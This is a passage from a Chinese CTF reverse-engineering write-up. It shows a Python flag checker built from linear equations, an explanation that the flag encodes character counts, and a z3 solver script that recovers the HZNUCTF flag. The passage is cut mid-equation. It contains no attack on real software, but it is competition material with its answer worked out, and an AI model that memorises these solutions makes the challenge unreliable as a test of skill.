class="number">19</span>] + <span class="number">99999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] == <span class="number">2762025</span>,</span><br><span class="line">         <span class="number">1323</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">9999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] == <span class="number">1551621</span>,</span><br><span class="line">         <span class="number">777</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] == <span class="number">948348</span>,</span><br><span class="line">         <span class="number">97</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] == <span class="number">777044</span>,</span><br><span class="line">         <span class="number">177</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">699</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">64</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">28</span> * i11i1Iii1I1[<span class="number">28</span>] == <span class="number">185016</span>,</span><br><span class="line">         <span class="number">77</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">-58</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">28</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">29</span>] == <span class="number">130106</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(ii1iIi1i11i):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congratulation!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>是计下 flag 里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p><p>将下面的 z3 解出可以得到一个字符串 <strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p><p>一个字符一个数字配对，代表该字符在原 flag 中出现的次数。</p><p>除去前面 HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">_encrypted_</span>):</span><br><span class="line">    mapping = <span class="string">&quot;6257645365477364777645752361&quot;</span></span><br><span class="line">    </span><br><span class="line">    char_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    remaining_map = &#123;</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    char_map.update(remaining_map)</span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&quot;HZNUCTF&#123;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mapping:</span><br><span class="line">        result += char_map[num]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">Enc = [Int(<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">7</span> * Enc[<span class="number">0</span>] == <span class="number">504</span>)</span><br><span class="line">s.add(<span class="number">9</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>] == <span class="number">403</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] == <span class="number">799</span>)</span><br><span class="line">s.add(<span class="number">3</span> * Enc[<span class="number">0</span>] + <span class="number">8</span> * Enc[<span class="number">1</span>] + <span class="number">15</span> * Enc[<span class="number">2</span>] + <span class="number">20</span> * Enc[<span class="number">3</span>] == <span class="number">2938</span>)</span><br><span class="line">s.add((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">15</span> * Enc[<span class="number">1</span>] + <span class="number">20</span> * Enc[<span class="number">2</span>] - <span class="number">19</span> * Enc[<span class="number">3</span>]) + <span class="number">1</span> * Enc[<span class="number">4</span>] == <span class="number">2042</span>)</span><br><span class="line">s.add((<span class="number">7</span> * Enc[<span class="number">0</span>] + <span class="number">1</span> * Enc[<span class="number">1</span>] + <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">2</span> * Enc[<span class="number">4</span>] + <span class="number">5</span> * Enc[<span class="number">5</span>] == <span class="number">1225</span>)</span><br><span class="line">s.add(<span class="number">11</span> * Enc[<span class="number">0</span>] + <span class="number">22</span> * Enc[<span class="number">1</span>] + <span class="number">33</span> * Enc[<span class="number">2</span>] + <span class="number">44</span> * Enc[<span class="number">3</span>] + <span class="number">55</span> * Enc[<span class="number">4</span>] + <span class="number">66</span> * Enc[<span class="number">5</span>] - <span class="number">77</span> * Enc[<span class="number">6</span>] == <span class="number">7975</span>)</span><br><span class="line">s.add(((<span class="number">21</span> * Enc[<span class="number">0</span>] + <span class="number">23</span> * Enc[<span class="number">1</span>] + <span class="number">3</span> * Enc[<span class="number">2</span>] + <span class="number">24</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">6</span> * Enc[<span class="number">5</span>] - <span class="number">7</span> * Enc[<span class="number">6</span>]) + <span class="number">15</span> * Enc[<span class="number">7</span>] == <span class="number">229</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">13</span> * Enc[<span class="number">2</span>] + <span class="number">0</span> * Enc[<span class="number">3</span>] - <span class="number">65</span> * Enc[<span class="number">4</span>]) + <span class="number">15</span> * Enc[<span class="number">5</span>] + <span class="number">29</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] + <span class="number">20</span> * Enc[<span class="number">8</span>] == <span class="number">2107</span>)</span><br><span class="line">s.add((<span class="number">10</span> * Enc[<span class="number">0</span>] + <span class="number">7</span> * Enc[<span class="number">1</span>] + -<span class="number">9</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] + <span class="number">1</span> * Enc[<span class="number">5</span>] + <span class="number">22</span> * Enc[<span class="number">6</span>] + <span class="number">21</span> * Enc[<span class="number">7</span>] - <span class="number">22</span> * Enc[<span class="number">8</span>]) + <span class="number">30</span> * Enc[<span class="number">9</span>] == <span class="number">4037</span>)</span><br><span class="line">s.add((<span class="number">15</span> * Enc[<span class="number">0</span>] + <span class="number">59</span> * Enc[<span class="number">1</span>] + <span class="number">56</span> * Enc[<span class="number">2</span>] + <span class="number">66</span> * Enc[<span class="number">3</span>] + <span class="number">7</span> * Enc[<span class="number">4</span>] + <span class="number">1</span> * Enc[<span class="number">5</span>] - <span class="number">122</span> * Enc[<span class="number">6</span>]) + <span class="number">21</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">3</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>] == <span class="number">4950</span>)</span><br><span class="line">s.add((((<span class="number">13</span> * Enc[<span class="number">0</span>] + <span class="number">66</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">39</span> * Enc[<span class="number">3</span>] - <span class="number">33</span> * Enc[<span class="number">4</span>]) + <span class="number">13</span> * Enc[<span class="number">5</span>] - <span class="number">2</span> * Enc[<span class="number">6</span>]) + <span class="number">42</span> * Enc[<span class="number">7</span>] + <span class="number">62</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] == <span class="number">12544</span>)</span><br><span class="line">s.add((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">3</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">63</span> * Enc[<span class="number">5</span>] - <span class="number">25</span> * Enc[<span class="number">6</span>]) + <span class="number">2</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>] == <span class="number">6585</span>)</span><br><span class="line">s.add(((((<span class="number">223</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] - <span class="number">29</span> * Enc[<span class="number">2</span>] - <span class="number">53</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">3</span> * Enc[<span class="number">5</span>] - <span class="number">65</span> * Enc[<span class="number">6</span>]) + <span class="number">0</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">15</span> * Enc[<span class="number">10</span>]) + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">13</span> * Enc[<span class="number">13</span>] == <span class="number">6893</span>)</span><br><span class="line">s.add(((((<span class="number">29</span> * Enc[<span class="number">0</span>] + <span class="number">13</span> * Enc[<span class="number">1</span>] - <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">93</span> * Enc[<span class="number">3</span>]) + <span class="number">33</span> * Enc[<span class="number">4</span>] + <span class="number">6</span> * Enc[<span class="number">5</span>] + <span class="number">65</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] - <span class="number">36</span> * Enc[<span class="number">8</span>]) + <span class="number">0</span> * Enc[<span class="number">9</span>] - <span class="number">16</span> * Enc[<span class="number">10</span>]) + <span class="number">96</span> * Enc[<span class="number">11</span>] - <span class="number">68</span> * Enc[<span class="number">12</span>]) + <span class="number">33</span> * Enc[<span class="number">13</span>] - <span class="number">14</span> * Enc[<span class="number">14</span>] == <span class="number">1883</span>)</span><br><span class="line">s.add((((<span class="number">69</span> * Enc[<span class="number">0</span>] + <span class="number">77</span> * Enc[<span class="number">1</span>] - <span class="number">93</span> * Enc[<span class="number">2</span>] - <span class="number">12</span> * Enc[<span class="number">3</span>]) + <span class="number">0</span> * Enc[<span class="number">4</span>] + <span class="number">0</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">16</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">6</span> * Enc[<span class="number">9</span>] + <span class="number">19</span> * Enc[<span class="number">10</span>] + <span class="number">66</span> * Enc[<span class="number">11</span>] - <span class="number">8</span> * Enc[<span class="number">12</span>]) + <span class="number">38</span> * Enc[<span class="number">13</span>] - <span class="number">16</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] == <span class="number">8257</span>)</span><br><span class="line">s.add(((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">2</span> * Enc[<span class="number">1</span>] - <span class="number">3</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">12</span> * Enc[<span class="number">4</span>] + <span class="number">24</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] + <span class="number">14</span> * Enc[<span class="number">8</span>] - <span class="number">0</span> * Enc[<span class="number">9</span>]) + <span class="number">1</span> * Enc[<span class="number">10</span>] + <span class="number">68</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">68</span> * Enc[<span class="number">13</span>] - <span class="number">26</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] - <span class="number">16</span> * Enc[<span class="number">16</span>] == <span class="number">5847</span>)</span><br><span class="line">s.add((((((<span class="number">24</span> * Enc[<span class="number">0</span>] + <span class="number">0</span> * Enc[<span class="number">1</span>] - <span class="number">1</span> * Enc[<span class="number">2</span>] - <span class="number">15</span> * Enc[<span class="number">3</span>]) + <span class="number">13</span> * Enc[<span class="number">4</span>] + <span class="number">4</span> * Enc[<span class="number">5</span>] + <span class="number">16</span> * Enc[<span class="number">6</span>] + <span class="number">67</span> * Enc[<span class="number">7</span>] + <span class="number">146</span> * Enc[<span class="number">8</span>] - <span class="number">50</span> * Enc[<span class="number">9</span>]) + <span class="number">16</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">27</span> * Enc[<span class="number">14</span>]) + <span class="number">45</span> * Enc[<span class="number">15</span>] - <span class="number">6</span> * Enc[<span class="number">16</span>]) + <span class="number">17</span> * Enc[<span class="number">17</span>] == <span class="number">18257</span>)</span><br><span class="line">s.add(((((<span class="number">25</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] - <span class="number">89</span> * Enc[<span class="number">2</span>]) + <span class="number">16</span> * Enc[<span class="number">3</span>] + <span class="number">19</span> * Enc[<span class="number">4</span>] + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">150</span> * Enc[<span class="number">8</span>] - <span class="number">250</span> * Enc[<span class="number">9</span>]) + <span class="number">166</span> * Enc[<span class="number">10</span>] + <span class="number">126</span> * Enc[<span class="number">11</span>] - <span class="number">11</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">207</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>] == <span class="number">12591</span>)</span><br><span class="line">s.add((((((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">8</span> * Enc[<span class="number">2</span>] + <span class="number">160</span> * Enc[<span class="number">3</span>] + <span class="number">9</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">15</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">66</span> * Enc[<span class="number">10</span>] + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>]) + <span class="number">19</span> * Enc[<span class="number">19</span>] == <span class="number">52041</span>)</span><br><span class="line">s.add(((((((<span class="number">29</span> * Enc[<span class="number">0</span>] - <span class="number">26</span> * Enc[<span class="number">1</span>]) + <span class="number">0</span> * Enc[<span class="number">2</span>] + <span class="number">60</span> * Enc[<span class="number">3</span>] + <span class="number">90</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">6</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">16</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">69</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>] - <span class="number">46</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] - <span class="number">1</span> * Enc[<span class="number">18</span>]) + <span class="number">39</span> * Enc[<span class="number">19</span>] - <span class="number">20</span> * Enc[<span class="number">20</span>] == <span class="number">20253</span>)</span><br><span class="line">s.add((((((((<span class="number">45</span> * Enc[<span class="number">0</span>] - <span class="number">56</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] + <span class="number">650</span> * Enc[<span class="number">3</span>] - <span class="number">900</span> * Enc[<span class="number">4</span>]) + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">6</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">2</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">651</span> * Enc[<span class="number">16</span>] + <span class="number">2</span> * Enc[<span class="number">17</span>] - <span class="number">10</span> * Enc[<span class="number">18</span>]) + <span class="number">69</span> * Enc[<span class="number">19</span>] - <span class="number">0</span> * Enc[<span class="number">20</span>]) + <span class="number">21</span> * Enc[<span class="number">21</span>] == <span class="number">18768</span>)</span><br><span class="line">s.add((((((<span class="number">555</span> * Enc[<span class="number">0</span>] - <span class="number">6666</span> * Enc[<span class="number">1</span>]) + <span class="number">70</span> * Enc[<span class="number">2</span>] + <span class="number">510</span> * Enc[<span class="number">3</span>] - <span class="number">90</span> * Enc[<span class="number">4</span>]) + <span class="number">499</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">610</span> * Enc[<span class="number">8</span>] - <span class="number">221</span> * Enc[<span 